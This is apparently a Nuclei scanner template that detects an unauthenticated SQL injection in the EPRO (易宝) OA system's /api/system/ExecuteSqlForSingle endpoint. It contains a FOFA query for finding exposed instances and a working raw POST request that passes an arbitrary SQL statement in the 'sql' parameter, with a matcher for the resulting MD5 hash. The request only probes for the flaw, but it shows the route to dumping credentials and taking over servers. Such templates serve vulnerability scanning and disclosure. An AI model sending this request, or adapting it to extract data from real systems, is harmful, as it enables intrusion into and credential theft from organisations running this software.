id: EPRO-OA-ExecuteSqlForSingle-sqli

info:
  name: 易宝(EPRO)OA系统ExecuteSqlForSingle接口存在SQL注入漏洞
  author: linfeng7z
  severity: critical
  description: 易宝OA系统ExecuteSqlForSingle接口存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限
  tags: 易宝OA,sqli,epro
  metadata:
    fofa-qeury: product="顶讯科技-易宝OA系统"
    veified: true

requests:
  - raw:
      - |
        POST /api/system/ExecuteSqlForSingle HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        
        token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters

    matchers:
      - type: dsl
        dsl:
          - "contains(body, 'e10adc3949ba59abbe56e057f20f883e')"
          - "status_code == 200"
        condition: and